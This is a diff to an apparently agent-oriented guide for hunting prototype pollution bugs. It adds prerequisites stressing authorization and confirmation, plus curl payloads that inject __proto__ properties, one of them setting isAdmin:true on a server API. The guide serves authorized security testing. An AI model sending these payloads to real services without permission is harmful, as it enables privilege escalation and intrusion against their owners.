@@ -26,6 +26,25 @@ Hunt for prototype pollution vulnerabilities where user-supplied properties merg
 - Template engines (EJS, Pug, Handlebars) in the same runtime as user-controlled objects.
 - Server-side Node.js with `child_process.exec`/`spawn` accessible via polluted options.
 
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# client-side: pollute via query param
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?__proto__[polluted]=true"
+
+# server-side: pollute via JSON body
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/config" \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"isAdmin":true}}'
+```
+
 ## Quick Detection
 
 ```bash
